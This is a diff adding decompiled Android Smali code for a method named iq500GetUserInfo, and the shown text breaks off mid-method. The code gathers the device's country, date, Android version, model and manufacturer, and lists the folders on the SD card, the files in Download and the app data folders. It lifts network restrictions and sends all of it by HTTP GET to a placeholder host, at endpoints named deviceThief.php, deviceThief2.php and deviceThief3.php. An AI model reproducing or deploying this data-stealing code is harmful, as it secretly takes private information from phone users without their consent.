@@ -1,0 +1,1225 @@
+.method private iq500GetUserInfo()V
+    .registers 35
+    .annotation system Ldalvik/annotation/Signature;
+        value = {
+            "()V"
+        }
+    .end annotation
+
+    .prologue
+    .line 30
+    move-object/from16 v2, p0
+
+    invoke-static {}, Ljava/text/DateFormat;->getDateTimeInstance()Ljava/text/DateFormat;
+
+    move-result-object v23
+
+    new-instance v24, Ljava/util/Date;
+
+    move-object/from16 v33, v24
+
+    move-object/from16 v24, v33
+
+    move-object/from16 v25, v33
+
+    invoke-direct/range {v25 .. v25}, Ljava/util/Date;-><init>()V
+
+    invoke-virtual/range {v23 .. v24}, Ljava/text/DateFormat;->format(Ljava/util/Date;)Ljava/lang/String;
+
+    move-result-object v23
+
+    move-object/from16 v4, v23
+
+    .line 32
+    new-instance v23, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v23
+
+    move-object/from16 v23, v33
+
+    move-object/from16 v24, v33
+
+    invoke-direct/range {v24 .. v24}, Ljava/lang/StringBuffer;-><init>()V
+
+    new-instance v24, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v24
+
+    move-object/from16 v24, v33
+
+    move-object/from16 v25, v33
+
+    invoke-direct/range {v25 .. v25}, Ljava/lang/StringBuffer;-><init>()V
+
+    new-instance v25, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v25
+
+    move-object/from16 v25, v33
+
+    move-object/from16 v26, v33
+
+    invoke-direct/range {v26 .. v26}, Ljava/lang/StringBuffer;-><init>()V
+
+    new-instance v26, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v26
+
+    move-object/from16 v26, v33
+
+    move-object/from16 v27, v33
+
+    invoke-direct/range {v27 .. v27}, Ljava/lang/StringBuffer;-><init>()V
+
+    new-instance v27, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v27
+
+    move-object/from16 v27, v33
+
+    move-object/from16 v28, v33
+
+    invoke-direct/range {v28 .. v28}, Ljava/lang/StringBuffer;-><init>()V
+
+    new-instance v28, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v28
+
+    move-object/from16 v28, v33
+
+    move-object/from16 v29, v33
+
+    invoke-direct/range {v29 .. v29}, Ljava/lang/StringBuffer;-><init>()V
+
+    new-instance v29, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v29
+
+    move-object/from16 v29, v33
+
+    move-object/from16 v30, v33
+
+    invoke-direct/range {v30 .. v30}, Ljava/lang/StringBuffer;-><init>()V
+
+    new-instance v30, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v30
+
+    move-object/from16 v30, v33
+
+    move-object/from16 v31, v33
+
+    invoke-direct/range {v31 .. v31}, Ljava/lang/StringBuffer;-><init>()V
+
+    new-instance v31, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v31
+
+    move-object/from16 v31, v33
+
+    move-object/from16 v32, v33
+
+    invoke-direct/range {v32 .. v32}, Ljava/lang/StringBuffer;-><init>()V
+
+    const-string v32, "From:"
+
+    invoke-virtual/range {v31 .. v32}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v31
+
+    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;
+
+    move-result-object v32
+
+    invoke-virtual/range {v32 .. v32}, Ljava/util/Locale;->getDisplayCountry()Ljava/lang/String;
+
+    move-result-object v32
+
+    invoke-virtual/range {v31 .. v32}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v31
+
+    invoke-virtual/range {v31 .. v31}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v31
+
+    invoke-virtual/range {v30 .. v31}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v30
+
+    const-string v31, "%20DateTime:"
+
+    invoke-virtual/range {v30 .. v31}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v30
+
+    invoke-virtual/range {v30 .. v30}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v30
+
+    invoke-virtual/range {v29 .. v30}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v29
+
+    move-object/from16 v30, v4
+
+    invoke-virtual/range {v29 .. v30}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v29
+
+    invoke-virtual/range {v29 .. v29}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v29
+
+    invoke-virtual/range {v28 .. v29}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v28
+
+    const-string v29, "%20AndroidVer:"
+
+    invoke-virtual/range {v28 .. v29}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v28
+
+    invoke-virtual/range {v28 .. v28}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v28
+
+    invoke-virtual/range {v27 .. v28}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v27
+
+    sget-object v28, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;
+
+    invoke-virtual/range {v27 .. v28}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v27
+
+    invoke-virtual/range {v27 .. v27}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v27
+
+    invoke-virtual/range {v26 .. v27}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v26
+
+    const-string v27, "%20Model:"
+
+    invoke-virtual/range {v26 .. v27}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v26
+
+    invoke-virtual/range {v26 .. v26}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v26
+
+    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v25
+
+    sget-object v26, Landroid/os/Build;->MODEL:Ljava/lang/String;
+
+    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v25
+
+    invoke-virtual/range {v25 .. v25}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v25
+
+    invoke-virtual/range {v24 .. v25}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v24
+
+    const-string v25, "%20Manufacturer:"
+
+    invoke-virtual/range {v24 .. v25}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v24
+
+    invoke-virtual/range {v24 .. v24}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v24
+
+    invoke-virtual/range {v23 .. v24}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v23
+
+    sget-object v24, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;
+
+    invoke-virtual/range {v23 .. v24}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v23
+
+    invoke-virtual/range {v23 .. v23}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v23
+
+    move-object/from16 v5, v23
+
+    .line 33
+    move-object/from16 v23, v5
+
+    const-string v24, " "
+
+    const-string v25, "_"
+
+    invoke-virtual/range {v23 .. v25}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v23
+
+    move-object/from16 v5, v23
+
+    .line 35
+    const-string v23, ""
+
+    move-object/from16 v6, v23
+
+    const-string v23, ""
+
+    move-object/from16 v7, v23
+
+    const-string v23, ""
+
+    move-object/from16 v8, v23
+
+    .line 40
+    :try_start_11a
+    new-instance v23, Ljava/io/File;
+
+    move-object/from16 v33, v23
+
+    move-object/from16 v23, v33
+
+    move-object/from16 v24, v33
+
+    new-instance v25, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v25
+
+    move-object/from16 v25, v33
+
+    move-object/from16 v26, v33
+
+    invoke-direct/range {v26 .. v26}, Ljava/lang/StringBuffer;-><init>()V
+
+    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;
+
+    move-result-object v26
+
+    invoke-virtual/range {v26 .. v26}, Ljava/io/File;->getPath()Ljava/lang/String;
+
+    move-result-object v26
+
+    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v25
+
+    const-string v26, "/"
+
+    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v25
+
+    invoke-virtual/range {v25 .. v25}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v25
+
+    invoke-direct/range {v24 .. v25}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+
+    move-object/from16 v9, v23
+
+    .line 41
+    move-object/from16 v23, v9
+
+    invoke-virtual/range {v23 .. v23}, Ljava/io/File;->listFiles()[Ljava/io/File;
+
+    move-result-object v23
+
+    move-object/from16 v10, v23
+
+    .line 43
+    move-object/from16 v23, v10
+
+    move-object/from16 v11, v23
+
+    const/16 v23, 0x0
+
+    move/from16 v12, v23
+
+    .line 45
+    :goto_158
+    move/from16 v23, v12
+
+    move-object/from16 v24, v11
+
+    move-object/from16 v0, v24
+
+    array-length v0, v0
+
+    move/from16 v24, v0
+
+    move/from16 v0, v23
+
+    move/from16 v1, v24
+
+    if-lt v0, v1, :cond_3ac
+
+    .line 49
+    new-instance v23, Ljava/io/File;
+
+    move-object/from16 v33, v23
+
+    move-object/from16 v23, v33
+
+    move-object/from16 v24, v33
+
+    new-instance v25, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v25
+
+    move-object/from16 v25, v33
+
+    move-object/from16 v26, v33
+
+    invoke-direct/range {v26 .. v26}, Ljava/lang/StringBuffer;-><init>()V
+
+    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;
+
+    move-result-object v26
+
+    invoke-virtual/range {v26 .. v26}, Ljava/io/File;->getPath()Ljava/lang/String;
+
+    move-result-object v26
+
+    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v25
+
+    const-string v26, "/Download/"
+
+    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v25
+
+    invoke-virtual/range {v25 .. v25}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v25
+
+    invoke-direct/range {v24 .. v25}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+
+    move-object/from16 v13, v23
+
+    .line 50
+    move-object/from16 v23, v13
+
+    invoke-virtual/range {v23 .. v23}, Ljava/io/File;->listFiles()[Ljava/io/File;
+
+    move-result-object v23
+
+    move-object/from16 v14, v23
+
+    .line 52
+    move-object/from16 v23, v14
+
+    move-object/from16 v15, v23
+
+    const/16 v23, 0x0
+
+    move/from16 v16, v23
+
+    .line 54
+    :goto_1a5
+    move/from16 v23, v16
+
+    move-object/from16 v24, v15
+
+    move-object/from16 v0, v24
+
+    array-length v0, v0
+
+    move/from16 v24, v0
+
+    move/from16 v0, v23
+
+    move/from16 v1, v24
+
+    if-lt v0, v1, :cond_3fa
+
+    .line 58
+    new-instance v23, Ljava/io/File;
+
+    move-object/from16 v33, v23
+
+    move-object/from16 v23, v33
+
+    move-object/from16 v24, v33
+
+    new-instance v25, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v25
+
+    move-object/from16 v25, v33
+
+    move-object/from16 v26, v33
+
+    invoke-direct/range {v26 .. v26}, Ljava/lang/StringBuffer;-><init>()V
+
+    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;
+
+    move-result-object v26
+
+    invoke-virtual/range {v26 .. v26}, Ljava/io/File;->getPath()Ljava/lang/String;
+
+    move-result-object v26
+
+    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v25
+
+    const-string v26, "/Android/data/"
+
+    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v25
+
+    invoke-virtual/range {v25 .. v25}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v25
+
+    invoke-direct/range {v24 .. v25}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+
+    move-object/from16 v17, v23
+
+    .line 59
+    move-object/from16 v23, v17
+
+    invoke-virtual/range {v23 .. v23}, Ljava/io/File;->listFiles()[Ljava/io/File;
+
+    move-result-object v23
+
+    move-object/from16 v18, v23
+
+    .line 61
+    move-object/from16 v23, v18
+
+    move-object/from16 v19, v23
+
+    const/16 v23, 0x0
+
+    move/from16 v20, v23
+
+    .line 63
+    :goto_1f2
+    move/from16 v23, v20
+
+    move-object/from16 v24, v19
+
+    move-object/from16 v0, v24
+
+    array-length v0, v0
+
+    move/from16 v24, v0
+    :try_end_1fb
+    .catch Ljava/lang/Exception; {:try_start_11a .. :try_end_1fb} :catch_496
+
+    move/from16 v0, v23
+
+    move/from16 v1, v24
+
+    if-lt v0, v1, :cond_448
+
+    .line 69
+    :goto_201
+    move-object/from16 v23, v6
+
+    const-string v24, "&"
+
+    const-string v25, ""
+
+    invoke-virtual/range {v23 .. v25}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
+
+    move-result-object v23
+
+    const-string v24, "+"
+
+    const-string v25, ""
+
+    invoke-virtual/range {v23 .. v25}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
+
+    move-result-object v23
+
+    const-string v24, "|"
+
+    const-string v25, ""
+
+    invoke-virtual/range {v23 .. v25}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
+
+    move-result-object v23
+
+    const-string v24, " "
+
+    const-string v25, ""
+
+    invoke-virtual/range {v23 .. v25}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
+
+    move-result-object v23
+
+    move-object/from16 v6, v23
+
+    .line 70
+    move-object/from16 v23, v7
+
+    const-string v24, "&"
+
+    const-string v25, ""
+
+    invoke-virtual/range {v23 .. v25}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
+
+    move-result-object v23
+
+    const-string v24, "+"
+
+    const-string v25, ""
+
+    invoke-virtual/range {v23 .. v25}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
+
+    move-result-object v23
+
+    const-string v24, "|"
+
+    const-string v25, ""
+
+    invoke-virtual/range {v23 .. v25}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
+
+    move-result-object v23
+
+    const-string v24, " "
+
+    const-string v25, ""
+
+    invoke-virtual/range {v23 .. v25}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
+
+    move-result-object v23
+
+    move-object/from16 v7, v23
+
+    .line 71
+    move-object/from16 v23, v8
+
+    const-string v24, "&"
+
+    const-string v25, ""
+
+    invoke-virtual/range {v23 .. v25}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
+
+    move-result-object v23
+
+    const-string v24, "+"
+
+    const-string v25, ""
+
+    invoke-virtual/range {v23 .. v25}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
+
+    move-result-object v23
+
+    const-string v24, "|"
+
+    const-string v25, ""
+
+    invoke-virtual/range {v23 .. v25}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
+
+    move-result-object v23
+
+    const-string v24, " "
+
+    const-string v25, ""
+
+    invoke-virtual/range {v23 .. v25}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
+
+    move-result-object v23
+
+    move-object/from16 v8, v23
+
+    .line 74
+    sget v23, Landroid/os/Build$VERSION;->SDK_INT:I
+
+    const/16 v24, 0x9
+
+    move/from16 v0, v23
+
+    move/from16 v1, v24
+
+    if-le v0, v1, :cond_291
+
+    .line 75
+    new-instance v23, Landroid/os/StrictMode$ThreadPolicy$Builder;
+
+    move-object/from16 v33, v23
+
+    move-object/from16 v23, v33
+
+    move-object/from16 v24, v33
+
+    invoke-direct/range {v24 .. v24}, Landroid/os/StrictMode$ThreadPolicy$Builder;-><init>()V
+
+    invoke-virtual/range {v23 .. v23}, Landroid/os/StrictMode$ThreadPolicy$Builder;->permitAll()Landroid/os/StrictMode$ThreadPolicy$Builder;
+
+    move-result-object v23
+
+    invoke-virtual/range {v23 .. v23}, Landroid/os/StrictMode$ThreadPolicy$Builder;->build()Landroid/os/StrictMode$ThreadPolicy;
+
+    move-result-object v23
+
+    move-object/from16 v9, v23
+
+    .line 76
+    move-object/from16 v23, v9
+
+    invoke-static/range {v23 .. v23}, Landroid/os/StrictMode;->setThreadPolicy(Landroid/os/StrictMode$ThreadPolicy;)V
+
+    .line 79
+    :cond_291
+    new-instance v23, Lorg/apache/http/impl/client/DefaultHttpClient;
+
+    move-object/from16 v33, v23
+
+    move-object/from16 v23, v33
+
+    move-object/from16 v24, v33
+
+    invoke-direct/range {v24 .. v24}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V
+
+    move-object/from16 v9, v23
+
+    .line 80
+    new-instance v23, Lorg/apache/http/client/methods/HttpGet;
+
+    move-object/from16 v33, v23
+
+    move-object/from16 v23, v33
+
+    move-object/from16 v24, v33
+
+    new-instance v25, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v25
+
+    move-object/from16 v25, v33
+
+    move-object/from16 v26, v33
+
+    invoke-direct/range {v26 .. v26}, Ljava/lang/StringBuffer;-><init>()V
+
+    new-instance v26, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v26
+
+    move-object/from16 v26, v33
+
+    move-object/from16 v27, v33
+
+    invoke-direct/range {v27 .. v27}, Ljava/lang/StringBuffer;-><init>()V
+
+    new-instance v27, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v27
+
+    move-object/from16 v27, v33
+
+    move-object/from16 v28, v33
+
+    invoke-direct/range {v28 .. v28}, Ljava/lang/StringBuffer;-><init>()V
+
+    new-instance v28, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v28
+
+    move-object/from16 v28, v33
+
+    move-object/from16 v29, v33
+
+    invoke-direct/range {v29 .. v29}, Ljava/lang/StringBuffer;-><init>()V
+
+    const-string v29, "http://yourwebsitehere.com/deviceThief.php"
+
+    invoke-virtual/range {v28 .. v29}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v28
+
+    const-string v29, "?basic="
+
+    invoke-virtual/range {v28 .. v29}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v28
+
+    invoke-virtual/range {v28 .. v28}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v28
+
+    invoke-virtual/range {v27 .. v28}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v27
+
+    move-object/from16 v28, v5
+
+    invoke-virtual/range {v27 .. v28}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v27
+
+    invoke-virtual/range {v27 .. v27}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v27
+
+    invoke-virtual/range {v26 .. v27}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v26
+
+    const-string v27, "&sdcardroot="
+
+    invoke-virtual/range {v26 .. v27}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v26
+
+    invoke-virtual/range {v26 .. v26}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v26
+
+    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v25
+
+    move-object/from16 v26, v6
+
+    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v25
+
+    invoke-virtual/range {v25 .. v25}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v25
+
+    invoke-direct/range {v24 .. v25}, Lorg/apache/http/client/methods/HttpGet;-><init>(Ljava/lang/String;)V
+
+    move-object/from16 v10, v23
+
+    .line 81
+    new-instance v23, Lorg/apache/http/client/methods/HttpGet;
+
+    move-object/from16 v33, v23
+
+    move-object/from16 v23, v33
+
+    move-object/from16 v24, v33
+
+    new-instance v25, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v25
+
+    move-object/from16 v25, v33
+
+    move-object/from16 v26, v33
+
+    invoke-direct/range {v26 .. v26}, Ljava/lang/StringBuffer;-><init>()V
+
+    new-instance v26, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v26
+
+    move-object/from16 v26, v33
+
+    move-object/from16 v27, v33
+
+    invoke-direct/range {v27 .. v27}, Ljava/lang/StringBuffer;-><init>()V
+
+    const-string v27, "http://yourwebsitehere.com/deviceThief2.php"
+
+    invoke-virtual/range {v26 .. v27}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v26
+
+    const-string v27, "?downloadlist="
+
+    invoke-virtual/range {v26 .. v27}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v26
+
+    invoke-virtual/range {v26 .. v26}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v26
+
+    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v25
+
+    move-object/from16 v26, v7
+
+    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v25
+
+    invoke-virtual/range {v25 .. v25}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v25
+
+    invoke-direct/range {v24 .. v25}, Lorg/apache/http/client/methods/HttpGet;-><init>(Ljava/lang/String;)V
+
+    move-object/from16 v11, v23
+
+    .line 82
+    new-instance v23, Lorg/apache/http/client/methods/HttpGet;
+
+    move-object/from16 v33, v23
+
+    move-object/from16 v23, v33
+
+    move-object/from16 v24, v33
+
+    new-instance v25, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v25
+
+    move-object/from16 v25, v33
+
+    move-object/from16 v26, v33
+
+    invoke-direct/range {v26 .. v26}, Ljava/lang/StringBuffer;-><init>()V
+
+    new-instance v26, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v26
+
+    move-object/from16 v26, v33
+
+    move-object/from16 v27, v33
+
+    invoke-direct/range {v27 .. v27}, Ljava/lang/StringBuffer;-><init>()V
+
+    const-string v27, "http://yourwebsitehere.com/deviceThief3.php"
+
+    invoke-virtual/range {v26 .. v27}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v26
+
+    const-string v27, "?applist="
+
+    invoke-virtual/range {v26 .. v27}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v26
+
+    invoke-virtual/range {v26 .. v26}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v26
+
+    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v25
+
+    move-object/from16 v26, v8
+
+    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v25
+
+    invoke-virtual/range {v25 .. v25}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v25
+
+    invoke-direct/range {v24 .. v25}, Lorg/apache/http/client/methods/HttpGet;-><init>(Ljava/lang/String;)V
+
+    move-object/from16 v12, v23
+
+    .line 86
+    move-object/from16 v23, v9
+
+    move-object/from16 v24, v10
+
+    :try_start_397
+    invoke-interface/range {v23 .. v24}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
+
+    move-result-object v23
+
+    .line 87
+    move-object/from16 v23, v9
+
+    move-object/from16 v24, v11
+
+    invoke-interface/range {v23 .. v24}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
+
+    move-result-object v23
+
+    .line 88
+    move-object/from16 v23, v9
+
+    move-object/from16 v24, v12
+
+    invoke-interface/range {v23 .. v24}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
+    :try_end_3aa
+    .catch Ljava/io/IOException; {:try_start_397 .. :try_end_3aa} :catch_49b
+
+    move-result-object v23
+
+    :goto_3ab
+    return-void
+
+    .line 43
+    :cond_3ac
+    move-object/from16 v23, v11
+
+    move/from16 v24, v12
+
+    :try_start_3b0
+    aget-object v23, v23, v24
+
+    move-object/from16 v13, v23
+
+    .line 44
+    move-object/from16 v23, v13
+
+    invoke-virtual/range {v23 .. v23}, Ljava/io/File;->isDirectory()Z
+
+    move-result v23
+
+    if-eqz v23, :cond_3f6
+
+    .line 45
+    new-instance v23, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v23
+
+    move-object/from16 v23, v33
+
+    move-object/from16 v24, v33
+
+    invoke-direct/range {v24 .. v24}, Ljava/lang/StringBuffer;-><init>()V
+
+    move-object/from16 v24, v6
+
+    invoke-virtual/range {v23 .. v24}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v23
+
+    new-instance v24, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v24
+
+    move-object/from16 v24, v33
+
+    move-object/from16 v25, v33
+
+    invoke-direct/range {v25 .. v25}, Ljava/lang/StringBuffer;-><init>()V
+
+    move-object/from16 v25, v13
+
+    invoke-virtual/range {v25 .. v25}, Ljava/io/File;->getName()Ljava/lang/String;
+
+    move-result-object v25
+
+    invoke-virtual/range {v24 .. v25}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v24
+
+    const-string v25, ":--:"
+
+    invoke-virtual/range {v24 .. v25}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v24
+
+    invoke-virtual/range {v24 .. v24}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v24
+
+    invoke-virtual/range {v23 .. v24}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v23
+
+    invoke-virtual/range {v23 .. v23}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v23
+
+    move-object/from16 v6, v23
+
+    :cond_3f6
+    add-int/lit8 v12, v12, 0x1
+
+    goto/16 :goto_158
+
+    .line 52
+    :cond_3fa
+    move-object/from16 v23, v15
+
+    move/from16 v24, v16
+
+    aget-object v23, v23, v24
+
+    move-object/from16 v17, v23
+
+    .line 53
+    move-object/from16 v23, v17
+
+    invoke-virtual/range {v23 .. v23}, Ljava/io/File;->isFile()Z
+
+    move-result v23
+
+    if-eqz v23, :cond_444
+
+    .line 54
+    new-instance v23, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v23
+
+    move-object/from16 v23, v33
+
+    move-object/from16 v24, v33
+
+    invoke-direct/range {v24 .. v24}, Ljava/lang/StringBuffer;-><init>()V
+
+    move-object/from16 v24, v7
+
+    invoke-virtual/range {v23 .. v24}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v23
+
+    new-instance v24, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v24
+
+    move-object/from16 v24, v33
+
+    move-object/from16 v25, v33
+
+    invoke-direct/range {v25 .. v25}, Ljava/lang/StringBuffer;-><init>()V
+
+    move-object/from16 v25, v17
+
+    invoke-virtual/range {v25 .. v25}, Ljava/io/File;->getName()Ljava/lang/String;
+
+    move-result-object v25
+
